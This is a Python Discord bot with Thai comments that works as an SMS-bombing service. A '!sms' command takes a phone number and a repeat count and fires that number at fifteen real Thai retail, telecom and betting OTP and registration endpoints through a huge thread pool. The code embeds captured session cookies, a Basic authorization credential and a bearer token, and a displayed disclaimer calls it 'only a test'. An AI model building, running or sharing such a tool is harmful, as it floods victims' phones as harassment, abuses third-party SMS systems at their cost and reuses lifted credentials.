import time
import threading
import discord
from discord.interactions import Interaction
import requests
import random
from bs4 import BeautifulSoup as bs
import json
import os
from discord.ui import Button, View, Modal
from concurrent.futures import ThreadPoolExecutor
from discord import app_commands, ui

####################################################################
# ส่วนนี้สำหรับตั้งค่าบอทก่อนรันนะครับ
token = "" # โทเค็นบอท
server = "1513933011853512835" # <--- ไอดีเซิร์ฟเวอร์ของเรา
spam_max = 100 # <--- จำนวนการยิงเบอร์สูงสุด
title_ui = "บริการยิงเบอร์ | แมวส้มชาว" # <--- ชื่อ Title ในที่กรอกเบอร์และจำนวน (Modal)
des = '"เป็นแค่การทดสอบเท่านั้น"'  # ข้อความอธิบายในส่วนของ Embed
label = "Click Me!" # ชื่อปุ่มกดยิงเบอร์
url = "https://cdn.discordapp.com/attachments/1513913711650144316/1513917209653547291/laptop-hacking.gif?ex=6a2978c6&is=6a282746&hm=bec90d558f52c59e2a6b12b8f44c6f4180f453d04115805bdb1e0e39fdd90358&" # <--- Url รูปภาพ
####################################################################

threading = ThreadPoolExecutor(max_workers=int(100000))

def api1(target):
	try:
		r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": target,"password":"6302814184624az","name":target,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	except:
		pass
		
def api2(target):
	try:
		response2 = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
	except:
		pass
		
def api3(target):
	try:
		requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
	except:
		pass

def api4(target):
	try:
		headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
		requests.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={target}&type=1")
	except:
		pass
		
def api5(target):
	headers = {
		"Host": "shopgenix.com",
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": "okhttp/3.14.9"
	}
	try:
		requests.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={target}")
	except:
		pass
		
def api6(target):
	try:
		response = requests.post("https://api.starzth.com/v2/token",headers={"Authorization": "Basic c2hvcDE3ODFBUEk6TVlWQmtkI2cyJmEyWSMzQGM="})
		token = response.json()['token']
		headers = {
			"authorization": "Bearer " + token,
			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
		}
		requests.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":target,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{target[1:]}"})
	except:
		pass
		
def api7(target):
	try:
		requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{target}"})
	except:
		pass
		
def api8(target):
	try:
		requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{target}","type":"login"})
	except:
		pass
		
def api9(target):
	try:
		requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={target}",headers={
	    "Accept": "application/json, text/plain, /",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
	except:
		pass
		
def api10(target):
	try:
		requests.post("https://www.konvy.com/ajax/system.php?action=get_phone_code",data=f"type=reg&phone={target}&platform=1",headers={"accept": "application/json, text/plain, text/html, text/xml, text/javascript ,image/webp, */*","content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","cookie": "f34c_lang2=th_TH;_gcl_au=1.1.772736218.1693663780;_tt_enable_cookie=1;_ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma;k_privacy_state=true;_fbp=fb.1.1693663782140.1359249614;_gid=GA1.2.496014264.1694796867;_gat_UA-28072727-2=1;PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28;_ga=GA1.1.1256061802.1693663783;_ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0;cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0Qb0"})
	except:
		pass
		
def api11(target):
	headers = {
		"content-type": "application/json; charset=utf-8",
		"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..L4_HNTppIThHoII_MTndvA.7f_dO0lW5BKDf0AOw9QyinAURihBdvue6G0Xkb18_UXwbM_FxAtk4gknM8kQwSX7Rhfg188UFI73nB8CNu-YPgP-il9Q-4W53yuXC3HQPnBIvGkkFAhZ2JuE8piw0fkGaOGGRvOkhpHNEdaE6jYbRg.IkvgAosR8q6-gZIQANsaqA",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
		"cookie": "_vwo_uuid_v2=DEED3E33BAB6E6FD264940A38AE9770A3|f4d3bf084f98482cfae4d65b7fba48d7;_gcl_au=1.1.102477073.1693664216;__rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22XzVm9LWMCkhD9kjex4AI%22%7D;__lt__cid=ddc5d79b-b37c-47dd-b6e1-f19aedffcd71;__lt__sid=4a20fa5e-1bc444d4;_gid=GA1.2.387552209.1693664218;_gat_UA-12345-6=1;_hjSessionUser_1027858=eyJpZCI6IjJmYTEwNTdkLWExNjYtNWQzMS05OWE3LTczZjU5MTM0NjRkZSIsImNyZWF0ZWQiOjE2OTM2NjQyMTkyODQsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_1027858=0;_hjSession_1027858=eyJpZCI6IjY4NTZiMTIxLWM5NzAtNDEyZS1iNWVmLTM1ODhhMGNmNmFjZCIsImNyZWF0ZWQiOjE2OTM2NjQyMTkzMDUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fbp=fb.1.1693664219891.541560784;_tt_enable_cookie=1;_ttp=iIHPi-I_pJMyjSs4jgyO6N1YFcJ;_ga=GA1.2.1790770154.1693664218;cto_bundle=GcneO19nQnBDU1lxRzRzZ05BUFQ3bndkU3VDb2MxcHZkaiUyQnMlMkZzdzQzSEgxd0R3a3Y5aVIyOXBsTVg4S0poSmt3YiUyRkV3aTF3Z3NuVFYyREt2WDF5bUlMdjl2TG9rQlNlejdBUEIyZTRBTiUyRm9QcktTT3lyM3ElMkY3VENUcUxUYjVHRjVQVnBXZWE2bmF2eHQlMkI5YUxNNjJ0WWpRc1ElM0QlM0Q;_ga_QEVF0JHYKM=GS1.1.1693664218.1.1.1693664222.56.0.0;ajs_anonymous_id=4314c63d-9cc9-4477-a8e9-77bcb52a8800"
	}
	try:
		requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{target[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{target[1:]}&phoneCountryCode=%2B66&b-uid=1.0.835")
	except:
		pass
		
def api12(target):
	try:
		requests.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{target[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",})
	except:
		pass
		
def api13(target):
	try:
		requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": target},headers={"Content-Type": "application/json"})
	except:
		pass
		
def api14(target):
	try:
		ip = requests.get("https://ipinfo.io/json").json()['ip']
		requests.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip})
	except:
		pass
		
def api15(target):
	try:
		requests.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}")
	except:
		pass

def startSMS2(phone,count):
	for _ in range(count):
		threading.submit(api1, phone)
		threading.submit(api3, phone)
		threading.submit(api4, phone)
		threading.submit(api5, phone)
		threading.submit(api6, phone)
		threading.submit(api7, phone)
		threading.submit(api8, phone)
		threading.submit(api9, phone)
		threading.submit(api10, phone)
		threading.submit(api11, phone)
		threading.submit(api12, phone)
		threading.submit(api13, phone)
		threading.submit(api14, phone)
		threading.submit(api15, phone)

# สร้างอินเทนต์ให้อ่านเนื้อหาข้อความในห้องแชทได้ (Message Content Intent)
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    await client.change_presence(activity=discord.Game(name="สั่งงานพิมพ์ !sms [เบอร์] [จำนวน]"))

@client.event
async def on_message(message):
    # ป้องกันไม่ให้บอทรันคำสั่งของตัวเอง
    if message.author == client.user:
        return

    # ตรวจจับพิมพ์คำสั่งเริ่มต้นด้วย !sms
    if message.content.startswith('!sms'):
        try:
            # แยกข้อความออกเป็นส่วน ๆ เช่น ['!sms', '095xxxxxxx', '50']
            args = message.content.split()
            
            # ถ้าพิมพ์มาไม่ครบตามรูปแบบ ให้แจ้งวิธีใช้
            if len(args) < 3:
                embed = discord.Embed(
                    title="❌ รูปแบบคำสั่งไม่ถูกต้อง",
                    description="**กรุณาพิมพ์รูปแบบ: `!sms [เบอร์โทรศัพท์] [จำนวนรอบ]`**\nตัวอย่างเช่น: `!sms 0951234567 50`",
                    color=0xFF0000
                )
                await message.reply(embed=embed)
                return

            phone = args[1]
            count_str = args[2]

            # ตรวจสอบความยาวของเบอร์โทรศัพท์
            if len(phone) != 10 or not phone.isdigit():
                embed = discord.Embed(
                    title="❌ รูปแบบเบอร์โทรไม่ถูกต้อง",
                    description="**กรุณาระบุเบอร์โทรศัพท์ให้ครบ 10 หลักและเป็นตัวเลขเท่านั้น**",
                    color=0xFF0000
                )
                await message.reply(embed=embed)
                return

            count = int(count_str)

            # ตรวจสอบจำนวนรอบไม่ให้เกินกำหนด
            if count > spam_max or count <= 0:
                embed = discord.Embed(
                    title="❌ ทำรายการไม่สำเร็จ",
                    description=f"**กรุณาระบุจำนวนรอบตั้งแต่ 1 ถึงสูงสุดไม่เกิน {spam_max} รอบ**",
                    color=0xFF0000
                )
                await message.reply(embed=embed)
                return

            # ถ้าเงื่อนไขผ่านทั้งหมด ให้เริ่มทำการยิงและส่งข้อความบอกผู้ใช้
            embed = discord.Embed(
                title=f"🟢 {title_ui}",
                description=f"**เริ่มส่งข้อความไปที่เบอร์ {phone} แล้วจำนวน {count} รอบ!**\n{des}",
                color=0x0B0FC3
            )
            if url:
                embed.set_image(url=url)
                
            await message.reply(embed=embed)
            
            # สั่งให้เอนจิ้น Thread ทำงานส่ง SMS
            startSMS2(phone, count)

        except ValueError:
            embed = discord.Embed(
                title="❌ ทำรายการไม่สำเร็จ",
                description="**เนื่องจากคุณระบุรูปแบบจำนวนรอบไม่ใช่ตัวเลขที่ถูกต้อง**",
                color=0xFF0000
            )
            await message.reply(embed=embed)
        except Exception as e:
            print(f"เกิดข้อผิดพลาด: {e}")

def keep_alive():
    import time
    while True:
        time.sleep(3600)

import threading
threading.Thread(target=keep_alive, daemon=True).start()

# สั่งรันบอตด้วยคำสั่งภาษาอังกฤษมาตรฐาน (ห้ามใช้คำว่า ลูกทีม.วิ่ง)
client.run(os.getenv('DISCORD_TOKEN'))
